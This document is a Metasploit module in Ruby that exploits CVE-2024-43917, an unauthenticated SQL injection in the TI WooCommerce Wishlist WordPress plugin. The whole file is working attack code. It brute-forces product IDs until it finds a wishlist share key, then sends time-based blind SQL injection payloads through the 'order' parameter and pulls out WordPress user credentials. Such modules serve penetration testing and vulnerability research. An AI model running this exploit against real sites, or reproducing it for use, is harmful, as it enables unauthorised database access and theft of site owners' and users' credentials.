##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress TI WooCommerce Wishlist SQL Injection (CVE-2024-43917)',
        'Description' => %q{
          The TI WooCommerce Wishlist plugin <= 2.8.2 is vulnerable to an unauthenticated SQL injection, allowing attackers to retrieve sensitive information.
        },
        'Author' => [
          'Rafie Muhammad',       # Vulnerability Discovery
          'Valentin Lobstein'     # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-43917'],
          ['WPVDB', 'e994753e-ce18-48cf-8087-897ec8db2eef'],
          ['URL', 'https://patchstack.com/articles/unpatched-sql-injection-vulnerability-in-ti-woocommerce-wishlist-plugin/']
        ],
        'Actions' => [
          ['Retrieve Share Key and Perform SQLi', { 'Description' => 'Retrieve share key and perform SQL Injection' }]
        ],
        'DefaultAction' => 'Retrieve Share Key and Perform SQLi',
        'DefaultOptions' => { 'VERBOSE' => true, 'COUNT' => 1 },
        'DisclosureDate' => '2024-09-25',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options [
      OptInt.new('PRODUCT_ID_MIN', [true, 'Minimum Product ID to bruteforce', 0]),
      OptInt.new('PRODUCT_ID_MAX', [true, 'Maximum Product ID to bruteforce', 100])
    ]
  end

  def get_share_key
    min = datastore['PRODUCT_ID_MIN']
    max = datastore['PRODUCT_ID_MAX']
    print_status("Testing Product IDs from #{min} to #{max}, please wait...")

    (min..max).each do |product_id|
      post_data = Rex::MIME::Message.new
      post_data.add_part('', nil, nil, 'form-data; name="tinv_wishlist_id"')
      post_data.add_part(product_id.to_s, nil, nil, 'form-data; name="product_id"')
      post_data.add_part('addto', nil, nil, 'form-data; name="product_action"')

      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path),
        'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
        'data' => post_data.to_s
      })

      next unless res&.code == 200

      json_body = res.get_json_document
      wishlist_data = json_body['wishlists_data']['products']

      next unless wishlist_data && !wishlist_data.empty?

      share_key = json_body['wishlist']['share_key']
      if share_key
        print_good("Share key found: #{share_key}")
        return share_key
      end
    end

    fail_with(Failure::NotFound, 'No valid product ID found.')
  end

  def run_host(_ip)
    share_key = get_share_key
    print_status("Performing SQL Injection using share key: #{share_key}")

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => target_uri.path,
        'vars_get' => {
          '_method' => 'GET',
          'order' => ",(SELECT #{payload})--"
        },
        'vars_post' => {
          'rest_route' => "/wc/v3/wishlist/#{share_key}/get_products"
        },
        'keep_cookies' => true
      })

      fail_with(Failure::Unreachable, 'Connection failed') unless res
    end

    if @sqli.test_vulnerable
      print_status('SQL Injection successful, retrieving user credentials...')
      wordpress_sqli_initialize(@sqli)
      wordpress_sqli_get_users_credentials(datastore['COUNT'])
    else
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable to SQL injection.')
    end
  end
end
